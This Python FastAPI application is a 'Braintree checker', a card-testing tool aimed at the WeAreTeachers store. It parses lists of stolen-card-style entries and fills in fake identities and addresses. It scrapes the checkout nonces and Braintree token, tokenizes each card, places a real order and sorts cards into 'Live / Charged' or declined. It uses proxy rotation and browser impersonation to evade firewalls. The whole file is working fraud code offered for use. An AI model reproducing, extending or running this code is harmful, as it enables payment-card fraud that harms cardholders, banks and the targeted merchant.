from __future__ import annotations

import asyncio
import base64
import html as htmllib
import json
import logging
import os
import random
import re
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from typing import Any

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession
from faker import Faker

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("ollie.weareteachers.checker")

app = FastAPI(title="WeAreTeachers Braintree Checker", version="10.1.0")

fake = Faker("en_US")
Faker.seed()

US_TAX_FREE_ADDRESSES = [
    {"address_1": "86 Bloomfield St.", "address_2": "", "city": "Pawtucket", "state": "RI", "postcode": "02861", "phone": "(401) 475-3095"},
    {"address_1": "750 SW Yamhill St", "address_2": "", "city": "Portland", "state": "OR", "postcode": "97205", "phone": "(503) 226-1111"},
    {"address_1": "1000 Elm St", "address_2": "", "city": "Manchester", "state": "NH", "postcode": "03101", "phone": "(603) 625-1000"},
    {"address_1": "1201 N Market St", "address_2": "", "city": "Wilmington", "state": "DE", "postcode": "19801", "phone": "(302) 658-9000"},
    {"address_1": "208 N Broadway", "address_2": "", "city": "Billings", "state": "MT", "postcode": "59101", "phone": "(406) 252-5555"},
]


@dataclass(frozen=True, slots=True)
class AuthVerdict:
    status: str
    reason: str
    http_status: int | None = None
    latency_ms: float = 0.0
    bin_info: dict[str, str] = field(default_factory=dict)
    target_used: str = "WeAreTeachers Braintree"
    card_masked: str | None = None
    proxy_used: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status,
            "reason": self.reason,
            "http_status": self.http_status,
            "latency_ms": round(self.latency_ms, 2),
            "bin_info": self.bin_info,
            "target_used": self.target_used,
            "card_masked": self.card_masked,
            "proxy_used": self.proxy_used,
        }


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
    clean = raw_line.strip()
    if not clean or clean.startswith("#"):
        return None
    parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", clean) if p.strip()]
    if len(parts) >= 4:
        cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        if cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit():
            if verify_luhn(cc) and (1 <= int(mm) <= 12):
                return cc, mm, yy, cvv
    return None


def parse_proxy_string(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url or not proxy_url.strip():
        return None
    raw = proxy_url.strip()
    
    # URL-encode password/session tokens if special characters are present
    if "://" in raw:
        protocol, rest = raw.split("://", 1)
        if "@" in rest:
            auth, hostport = rest.rsplit("@", 1)
            if ":" in auth:
                user, pwd = auth.split(":", 1)
                encoded_pwd = urllib.parse.quote(pwd, safe="")
                formatted = f"{protocol}://{user}:{encoded_pwd}@{hostport}"
            else:
                formatted = raw
        else:
            formatted = raw
    else:
        parts = raw.split(":")
        if len(parts) == 4:
            host, port, user, pw = parts
            encoded_pwd = urllib.parse.quote(pw, safe="")
            formatted = f"http://{user}:{encoded_pwd}@{host}:{port}"
        else:
            formatted = f"http://{raw}"
            
    return {"http": formatted, "https": formatted}


async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = None) -> dict[str, str]:
    bin_code = card_number[:6]
    default_meta = {"bank": "Unknown Bank", "country": "US", "scheme": "CARD", "type": "CREDIT"}
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies, verify=False, timeout=8) as session:
            resp = await session.get(f"https://lookup.binlist.net/{bin_code}", headers={"Accept-Version": "3"}, timeout=4)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("alpha2", "US"),
                    "scheme": data.get("scheme", "CARD").upper(),
                    "type": data.get("type", "CREDIT").upper(),
                }
    except Exception:
        pass
    return default_meta


def decode_bt_token(raw: str) -> str | None:
    if not raw:
        return None
    raw = raw.strip().strip('"').strip("'")
    try:
        pad = len(raw) % 4
        dec = base64.b64decode(raw + ("=" * (4 - pad) if pad else "")).decode("utf-8", "ignore")
        m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', dec)
        if m:
            return m.group(1)
    except Exception:
        pass
    m_direct = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', raw)
    return m_direct.group(1) if m_direct else None


async def execute_check(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
    host = "https://www.weareteachers.com"
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    ident = {
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "company": "",
        "country": "US",
        **random.choice(US_TAX_FREE_ADDRESSES),
        "email": f"{fake.first_name().lower()}{random.randint(100,999)}@gmail.com"
    }
    session_id = str(uuid.uuid4())

    # Load Cart & Checkout
    await session.get(f"{host}/?add-to-cart=1909302", headers={"user-agent": ua}, timeout=10)
    co = await session.get(f"{host}/checkout/", headers={"user-agent": ua}, timeout=10)
    if "/checkout" not in co.url:
        return "DECLINED", f"Cloudflare / Firewall Block (HTTP {co.status_code})", co.status_code

    html = co.text
    m_sn = re.search(r"storeApiNonce\s*:\s*['\"]([a-f0-9]+)['\"]", html, re.I)
    m_ctn = re.search(r'"client_token_nonce"\s*:\s*"([a-f0-9]+)"', html, re.I)
    
    store_nonce = m_sn.group(1) if m_sn else co.headers.get("Nonce", "")
    client_token_nonce = m_ctn.group(1) if m_ctn else ""

    if not client_token_nonce or not store_nonce:
        return "DECLINED", "Session security nonces missing", 200

    # Fetch Braintree Token via Ajax
    ajax_res = await session.post(
        f"{host}/wp-admin/admin-ajax.php",
        data={"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce},
        headers={"content-type": "application/x-www-form-urlencoded", "user-agent": ua, "x-requested-with": "XMLHttpRequest"},
        timeout=8
    )
    
    fingerprint = None
    try:
        j = ajax_res.json()
        fingerprint = decode_bt_token(str(j.get("data", "")))
    except Exception:
        fingerprint = decode_bt_token(ajax_res.text)

    if not fingerprint:
        return "DECLINED", "Braintree fingerprint generation failed", 200

    # Tokenize via Braintree GraphQL
    tp = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 binData { issuingBank } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv,
                    "cardholderName": f"{ident['first_name']} {ident['last_name']}",
                    "billingAddress": {"countryCodeAlpha2": "US", "locality": ident["city"], "region": ident["state"], "postalCode": ident["postcode"], "streetAddress": ident["address_1"]}
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    bt_resp = await session.post(
        "https://payments.braintree-api.com/graphql",
        json=tp,
        headers={"authorization": f"Bearer {fingerprint}", "braintree-version": "2018-05-10", "content-type": "application/json", "user-agent": ua},
        timeout=8
    )
    
    try:
        bj = bt_resp.json()
    except Exception:
        return "DECLINED", "Braintree gateway non-json response", bt_resp.status_code

    tokenize_obj = (bj.get("data") or {}).get("tokenizeCreditCard") or {}
    nonce_token = tokenize_obj.get("token")
    if not nonce_token:
        err_msg = str(bj.get("errors") or "Tokenization rejected")
        return "DECLINED", f"Tokenize error: {err_msg[:60]}", 200

    cc_meta = tokenize_obj.get("creditCard") or {}
    bin_data = cc_meta.get("binData") or {}
    bank_tag = (bin_data.get("issuingBank") or cc_meta.get("brandCode") or "").strip()

    # Final Store Checkout Post
    checkout_payload = {
        "billing_address": ident,
        "shipping_address": ident,
        "payment_method": "braintree_credit_card",
        "payment_data": [
            {"key": "wc_braintree_credit_card_payment_nonce", "value": nonce_token},
            {"key": "wc-braintree-credit-card-card-type", "value": "visa"},
        ],
    }

    rr = await session.post(
        f"{host}/wp-json/wc/store/v1/checkout?_locale=site",
        data=json.dumps(checkout_payload),
        headers={"content-type": "application/json", "nonce": store_nonce, "user-agent": ua},
        timeout=10
    )
    
    try:
        jj = rr.json()
    except Exception:
        return "DECLINED", f"Checkout response error HTTP {rr.status_code}", rr.status_code

    order_status = str(jj.get("status", "")).lower()
    if rr.status_code in (200, 201) and order_status in ("processing", "completed", "on-hold"):
        return "LIVE", f"Charged Successfully! | [{bank_tag}]", rr.status_code

    msgs = jj.get("message") or ((jj.get("data") or {}).get("cart") or {}).get("errors") or "Card Declined"
    clean_msg = re.sub(r"<[^>]+>", "", str(msgs)).strip()
    return "DECLINED", f"{clean_msg[:75]} | [{bank_tag}]", rr.status_code


@app.get("/api/auth/check")
async def check_card_endpoint(card: str, proxy: str | None = None) -> dict[str, Any]:
    started = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy)
    parsed = universal_card_formatter(card)
    
    if not parsed:
        return AuthVerdict(status="DECLINED", reason="Invalid Format / Luhn Failed", latency_ms=0.0, card_masked=card[:19]).to_dict()

    cc, mm, yy, cvv = parsed
    card_masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"
    bin_task = asyncio.create_task(fetch_bin_metadata(cc, proxies_dict))

    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies_dict, verify=False, timeout=20) as session:
            status, reason, code = await execute_check(session, cc, mm, yy, cvv)
        bin_info = await bin_task
        return AuthVerdict(status=status, reason=reason, http_status=code, latency_ms=(time.perf_counter() - started) * 1000, bin_info=bin_info, card_masked=card_masked, proxy_used=proxy).to_dict()
    except Exception as exc:
        bin_info = await bin_task
        return AuthVerdict(status="DECLINED", reason=f"Proxy / Network Failed: {type(exc).__name__}", latency_ms=(time.perf_counter() - started) * 1000, bin_info=bin_info, card_masked=card_masked, proxy_used=proxy).to_dict()


@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WeAreTeachers Braintree Pure Web Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white min-h-screen p-6">
    <main class="max-w-4xl mx-auto space-y-6">
        <h1 class="text-2xl font-bold text-sky-400">WeAreTeachers Pure Web Checker</h1>
        <div class="bg-zinc-900 rounded-xl p-5 space-y-4 border border-zinc-800">
            <div>
                <label class="block text-xs font-medium text-zinc-400 mb-1">Proxy (Optional)</label>
                <input id="proxyInput" type="text" placeholder="http://user:pass@host:port" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2 text-xs font-mono">
            </div>
            <div>
                <label class="block text-xs font-medium text-zinc-400 mb-1">Cards List</label>
                <textarea id="cardInput" rows="4" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-3 text-xs font-mono"></textarea>
            </div>
            <button onclick="runCheck()" class="bg-sky-600 hover:bg-sky-500 px-5 py-2.5 rounded-lg font-semibold w-full">Start Checking</button>
            <div class="grid grid-cols-2 gap-4">
                <div><h3 class="text-xs font-bold text-sky-400 mb-2">Live / Charged</h3><div id="liveBox" class="bg-zinc-950 p-3 rounded-lg text-xs font-mono min-h-[120px] max-h-60 overflow-y-auto space-y-1"></div></div>
                <div><h3 class="text-xs font-bold text-rose-400 mb-2">Declined</h3><div id="deadBox" class="bg-zinc-950 p-3 rounded-lg text-xs font-mono min-h-[120px] max-h-60 overflow-y-auto space-y-1"></div></div>
            </div>
        </div>
    </main>
    <script>
    async function runCheck() {
        const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
        const proxy = document.getElementById("proxyInput").value.trim();
        const liveBox = document.getElementById("liveBox");
        const deadBox = document.getElementById("deadBox");
        
        for (let c of cards) {
            let url = `/api/auth/check?card=${encodeURIComponent(c)}`;
            if (proxy) url += `&proxy=${encodeURIComponent(proxy)}`;
            try {
                let res = await fetch(url);
                let d = await res.json();
                let row = document.createElement("div");
                row.textContent = `[${d.status}] ${c} -> ${d.reason} (${d.latency_ms}ms)`;
                if (d.status === "LIVE") {
                    liveBox.appendChild(row);
                } else {
                    deadBox.appendChild(row);
                }
            } catch (e) {}
        }
    }
    </script>
</body>
</html>"""


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)), reload=False)
